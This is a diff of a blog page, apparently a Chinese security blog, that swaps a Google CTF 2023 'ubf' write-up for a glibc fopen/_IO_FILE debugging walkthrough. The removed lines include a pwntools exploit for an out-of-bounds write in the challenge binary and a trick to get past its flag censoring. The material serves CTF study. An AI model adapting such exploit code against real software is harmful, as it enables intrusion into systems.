-&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+    fdesc &#x3D; open (filename, posix_mode | (is32not64 ? 0 : O_LARGEFILE), prot);
+#else
+  fdesc &#x3D; open (filename, posix_mode, prot);
+#endif
+  if (fdesc &lt; 0)
+    return NULL;
+  fp-&gt;_fileno &#x3D; fdesc;
+  _IO_mask_flags (fp, read_write,_IO_NO_READS+_IO_NO_WRITES+_IO_IS_APPENDING);
+  &#x2F;* For append mode, send the file offset to the end of the file.  Don&#39;t
+     update the offset cache though, since the file handle is not active.  *&#x2F;
+  if ((read_write &amp; (_IO_IS_APPENDING | _IO_NO_READS))
+      &#x3D;&#x3D; (_IO_IS_APPENDING | _IO_NO_READS))
+    &#123;
+      _IO_off64_t new_pos &#x3D; _IO_SYSSEEK (fp, 0, _IO_seek_end);
+      if (new_pos &#x3D;&#x3D; _IO_pos_BAD &amp;&amp; errno !&#x3D; ESPIPE)
+	&#123;
+	  close_not_cancel (fdesc);
+	  return NULL;
+	&#125;
+    &#125;
+  _IO_link_in ((struct _IO_FILE_plus *) fp);
+  return fp;
+&#125;
+libc_hidden_def (_IO_file_open)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p>按规定格式输入之后会进行一系列的解码，再输出相应的内容，但是检测到输出内容含有<code>CTF&#123;</code>会将后续内容替换成<code>xxxx</code>，因此需要将这个头改成其他的绕过检测</p>
-<pre class="line-numbers language-C" data-language="C"><code class="language-C">void __fastcall censor_string(char *a1, int a2)
-&#123;
-  if ( a2 &gt; 5 &amp;&amp; *a1 &#x3D;&#x3D; &#39;C&#39; &amp;&amp; a1[1] &#x3D;&#x3D; &#39;T&#39; &amp;&amp; a1[2] &#x3D;&#x3D; &#39;F&#39; &amp;&amp; a1[3] &#x3D;&#x3D; &#39;&#123;&#39; )
-    memset(a1 + 4, &#39;X&#39;, a2 - 5);
-&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>漏洞点在修复损坏的布尔类型的函数中存在数组越界</p>
-<pre class="line-numbers language-C" data-language="C"><code class="language-C">void __fastcall fix_corrupt_booleans(UNPACK *string)
-&#123;
-  unsigned __int64 v1; &#x2F;&#x2F; [rsp+10h] [rbp-18h]
-  char *v2; &#x2F;&#x2F; [rsp+18h] [rbp-10h]
-  int i; &#x2F;&#x2F; [rsp+24h] [rbp-4h]
-
-  v2 &#x3D; &amp;string-&gt;mem[string-&gt;offset];            &#x2F;&#x2F; vuln
-  v1 &#x3D; &amp;string-&gt;mem[string-&gt;size];
-  for ( i &#x3D; 0; i &lt; string-&gt;len &amp;&amp; &amp;v2[i] &lt; v1; ++i )
-    v2[i] &#x3D; v2[i] !&#x3D; 0;
-&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>exp:</p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
-<span class="token keyword">from</span> base64 <span class="token keyword">import</span> <span class="token operator">*</span>
-
-<span class="token comment">#context.terminal = ['tmux','splitw','-h']</span>
-
-r <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./ubf"</span><span class="token punctuation">)</span>
-
-<span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>
-
-payload <span class="token operator">=</span> p32<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b's'</span> <span class="token operator">+</span> p16<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p16<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> p16<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b"$FLAG"</span>
-payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'b'</span> <span class="token operator">+</span> p16<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> p16<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">126</span><span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span> <span class="token operator">+</span> p16<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
-
-payload <span class="token operator">=</span> b64encode<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
-r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
-
-r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>调用<code>open</code>系统调用函数打开文件之后设置<code>fileno</code>标志位，再调用<code>_IO_link_in</code>使结构体进入<code>_IO_list_all</code>，至此<code>fopen</code>函数调试结束</p>
+<pre class="line-numbers language-C" data-language="C"><code class="language-C">pwndbg&gt; p new_f-&gt;fp
+$6 &#x3D; &#123;
+  file &#x3D; &#123;
+    _flags &#x3D; -72539004,
+    _IO_read_ptr &#x3D; 0x0,
+    _IO_read_end &#x3D; 0x0,
+    _IO_read_base &#x3D; 0x0,
+    _IO_write_base &#x3D; 0x0,
+    _IO_write_ptr &#x3D; 0x0,
+    _IO_write_end &#x3D; 0x0,
+    _IO_buf_base &#x3D; 0x0,
+    _IO_buf_end &#x3D; 0x0,
+    _IO_save_base &#x3D; 0x0,
+    _IO_backup_base &#x3D; 0x0,
+    _IO_save_end &#x3D; 0x0,
+    _markers &#x3D; 0x0,
+    _chain &#x3D; 0x7ffff7dd2540 &lt;_IO_2_1_stderr_&gt;,
+    _fileno &#x3D; 3,
+    _flags2 &#x3D; 0,
+    _old_offset &#x3D; 0,
+    _cur_column &#x3D; 0,
+    _vtable_offset &#x3D; 0 &#39;\000&#39;,
+    _shortbuf &#x3D; &quot;&quot;,
+    _lock &#x3D; 0x55555555b0f0,
+    _offset &#x3D; -1,
+    _codecvt &#x3D; 0x0,
+    _wide_data &#x3D; 0x55555555b100,
+    _freeres_list &#x3D; 0x0,
+    _freeres_buf &#x3D; 0x0,
+    __pad5 &#x3D; 0,
+    _mode &#x3D; 0,
+    _unused2 &#x3D; &#39;\000&#39; &lt;repeats 19 times&gt;
+  &#125;,
+  vtable &#x3D; 0x7ffff7dd06e0 &lt;_IO_file_jumps&gt;
+&#125;
+pwndbg&gt; p _IO_list_all
+$7 &#x3D; (struct _IO_FILE_plus *) 0x55555555b010<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 
                 
@@ -666,12 +890,8 @@ r<span class="token punctuation">.</span>interactive<span class="token punctuati
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/oob/">
-                                    <span class="chip bg-color">oob</span>
-                                </a>
-                            
-                                <a href="/tags/ubf/">
-                                    <span class="chip bg-color">ubf</span>
+                                <a href="/tags/IO/">
+                                    <span class="chip bg-color">IO</span>
                                 </a>
                             
                         </div>
@@ -715,9 +935,10 @@ r<span class="token punctuation">.</span>interactive<span class="token punctuati
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2023/08/12/io-file/io-file/">
                     <div class="card-image">
@@ -735,9 +956,9 @@ r<span class="token punctuation">.</span>interactive<span class="token punctuati
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2023-08-12
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-08-12
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -746,6 +967,7 @@ r<span class="token punctuation">.</span>interactive<span class="token punctuati
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -764,24 +986,24 @@ r<span class="token punctuation">.</span>interactive<span class="token punctuati
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2023/08/10/2023syctf-computer-fu-xian/2023syctf-computer-fu-xian/">
+                <a href="/2023/08/12/2023-googlectf-ubf/2023-googlectf-ubf/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/8.jpg" class="responsive-img" alt="2023_syctf_computer_pwn复现">
+                        <img src="/medias/featureimages/25.jpg" class="responsive-img" alt="2023_googlectf_ubf复现">
                         
-                        <span class="card-title">2023_syctf_computer_pwn复现</span>
+                        <span class="card-title">2023_googlectf_ubf复现</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            2023 syctf computer pwn复现
+                            2023googlectf_ubf复现
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2023-08-10
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-08-12
                             </span>
                         <span class="publish-author">
                             
@@ -798,8 +1020,12 @@ r<span class="token punctuation">.</span>interactive<span class="token punctuati
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/heap/">
-                        <span class="chip bg-color">heap</span>
+                    <a href="/tags/oob/">
+                        <span class="chip bg-color">oob</span>
+                    </a>
+                    
+                    <a href="/tags/ubf/">
+                        <span class="chip bg-color">ubf</span>
                     </a>
                     
                 </div>
